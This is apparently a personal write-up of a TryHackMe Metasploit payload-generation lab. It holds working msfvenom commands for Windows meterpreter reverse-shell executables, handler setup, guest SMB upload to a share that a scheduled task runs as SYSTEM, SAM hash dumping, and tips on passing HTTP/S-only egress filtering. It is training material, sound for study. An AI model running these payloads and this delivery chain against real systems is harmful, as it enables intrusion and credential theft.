# Metasploit: Payload Generation (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Metasploit and Exploitation (room 4 of the Metasploit module).
- **Room:** Metasploit: Payload Generation (~60 min, premium). msfvenom payload generation, formats,
  encoders, template injection, handlers, and a generate -> deliver -> catch -> loot capstone.
- **Date:** 2026-10-15 (solved live on the AWS AttackBox).
- **Status:** SOLVED - Tasks 2-7 theory + Task 8 capstone (session caught, hashes dumped, flag retrieved).
- **Lab:** AttackBox `<ip>` (LHOST, `ens5`; *not* `tun0` <ip> or `docker0`). Target
  `<ip>` = `CAPSTONE`, Windows Server 2019 x64, WORKGROUP. Target reached via gateway
  `<ip>` (confirmed with `ip route get`).

## Theory answers (Tasks 2-7)

| Task | Question | Answer |
|------|----------|--------|
| 2 | Flag that sets output format | `-f` |
| 2 | Flag that selects the payload | `-p` |
| 3 | Self-contained, no second download | `stageless` |
| 4 | Linux binary executable format | `elf` |
| 4 | Full command (stageless x64 win rev-TCP exe) | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=5555 -f exe -o backdoor.exe` |
| 5 | Most well-known encoder | `x86/shikata_ga_nai` |
| 5 | Flag for bad characters | `-b` |
| 6 | Flag to inject into a template binary | `-x` |
| 7 | Universal listener module | `exploit/multi/handler` |
| 7 | Keep listening after first session | `ExitOnSession` (set `false`) |

Key distinctions from the tasks:
- **Staged vs stageless:** `/` = staged (small stager, handler serves the stage), `_` = stageless
  (full agent in the file, connects once). Standalone msfvenom files -> prefer stageless for reliability.
- **Executable formats** (`exe`, `elf`, `macho`, `msi`, `apk`, `war`) = a file the target runs.
  **Transform formats** (`raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64`) = data/code you
  embed elsewhere.
- **Encoding != evasion.** `-e`/`-i`/`-b` are for bad-char removal / format compliance; the
  shikata_ga_nai decoder stub is itself a known signature. `-b` auto-picks a compatible encoder.
- **`-x` template inject**, `-k` keeps the template's original behaviour (payload in a separate thread);
  breaks the digital signature and changes the hash.

## Task 8 - Capstone answers

| Question | Answer |
|----------|--------|
| jim's NTLM hash | `<redacted-hash>` |
| Flag (`C:\Users\Administrator\Documents\flag.txt`) | retrieved live (39 bytes) - literal value not recorded in session; re-read with `cat "C:\\Users\\Administrator\\Documents\\flag.txt"` |

Full hashdump (lab creds, SAM):

```
Administrator:500:<redacted-hash>:<redacted-hash>:::
DefaultAccount:503:<redacted-hash>:<redacted-hash>:::
Guest:501:<redacted-hash>:<redacted-hash>:::
jim:1008:<redacted-hash>:<redacted-hash>:::
WDAGUtilityAccount:504:<redacted-hash>:<redacted-hash>:::
```

jim's NT hash = 4th colon-field (`...:NT:::`) = `<redacted-hash>` (32 hex).

## Capstone workflow (what actually worked)

Scenario: guest-writable SMB share; a scheduled task **runs then deletes** uploaded `.exe`s; target
egress is **HTTP/S only**.

1. **Confirm LHOST** - the target is off-subnet from `ens5`'s /18, so verify the routing source IP:
   ```
   ip route get <ip>      # -> via <ip> dev ens5 src <ip>
   ```
2. **Generate (HTTPS, stageless, x64, port 443):**
   ```
   msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=443 -f exe -o /root/shell.exe
   ```
3. **Enumerate shares** - `public` ("Public uploads") is the guest-writable drop:
   ```
   smbclient -N -L //<ip>/        # or auxiliary/scanner/smb/smb_enumshares
   ```
4. **Handler first** (so the scheduled run is caught), as a background job:
   ```
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter_reverse_https
   set LHOST <ip> ; set LPORT 443 ; set ExitOnSession false
   run -j
   ```
5. **Upload** over SMB as guest:
   ```
   use auxiliary/admin/smb/upload_file
   set RHOSTS <ip> ; set SMBUSER guest ; set SMBSHARE public
   set LPATH /root/shell.exe ; set RPATH shell.exe
   exploit                                 # [+] uploaded to shell.exe
   ```
6. **Wait for the scheduled task** -> session:
   ```
   [*] https://<ip>:443/ handling request from <ip> ... Attaching orphaned/stageless session
   [*] Meterpreter session 1 opened (<ip>:443 -> <ip>:50019)
   ```
7. **Loot** - already `NT AUTHORITY\SYSTEM` (the task runs as SYSTEM), x64 meterpreter on x64 OS:
   ```
   getuid ; sysinfo
   hashdump
   search -d C:\\Users\\Administrator -f *flag*
   cat "C:\\Users\\Administrator\\Documents\\flag.txt"
   ```

## Lessons learned

- **"Only HTTP/S outbound" meant protocol inspection, not just a port rule.** `meterpreter_reverse_tcp`
  on 443 uploaded fine but **never called back** across two task cycles. Switching to
  `meterpreter_reverse_https` on 443 connected on the first run. `reverse_https` does real TLS, so it
  passes both port-based *and* DPI filters - it strictly dominates raw TCP when egress is "HTTP/S only".
  The room's hint pushes `_reverse_tcp`, but that only settles staged-vs-stageless; the *transport* still
  has to match the firewall. Pick `reverse_https`/`reverse_http` for inspected egress.
- **Verify LHOST by routing, not by eye.** Target `<ip>` looked off-subnet from `ens5`
  (`<ip>/18` = `<ip> - <ip>`) but routes via the gateway; `ip route get <target>`
  prints the exact `src` to use as LHOST. Don't use `tun0`/`docker0`.
- **msfconsole eats commands typed during startup.** Pasting a `use ...; set ...; run` block right after
  `msfconsole -q` before the `msf >` prompt renders sends those lines into the void - the share-enum
  block was lost and left `SMBSHARE <share>` literal -> `STATUS_BAD_NETWORK_NAME`. Wait for the prompt,
  or run one-shot modules with `-x`.
- **Start the handler before delivery.** The task runs-then-deletes, so a missing/mismatched listener =
  a silently lost shot; `run -j` + `ExitOnSession false` keeps it catching across task cycles.
- **x64 payload on an x64 target avoids the hashdump migration dance.** Unlike
  [[metasploit-post-exploitation]] (x86 meterpreter on x64 -> `hashdump` failed until `migrate` to an x64
  process), here the x64 stageless payload gave a clean `x64/windows` SYSTEM session and `hashdump`
  worked first try.
- **Stageless for standalone files.** Self-contained, single connection, no stage-transfer failure point -
  the right default for msfvenom-delivered binaries.

## Reproduction notes

- Run `msfvenom` from a real shell, not the `msf >` prompt (there it needs `exec:` and can be interrupted);
  regenerate the file before re-uploading after a payload/transport change.
- Scheduled-task timing: allow ~2-3 min (a full task cycle) after upload before concluding a payload
  failed; re-upload if the cleanup pass wiped the previous copy.
- Lab credentials/hashes above are disposable THM lab values.

## Related

- [[metasploit-post-exploitation]] - previous module room; SYSTEM foothold + `hashdump` (and the x86->x64
  migration gotcha this room avoided).
- [[metasploit-module-plan]] - remaining Metasploit/shells rooms on the Jr Pen Tester path.
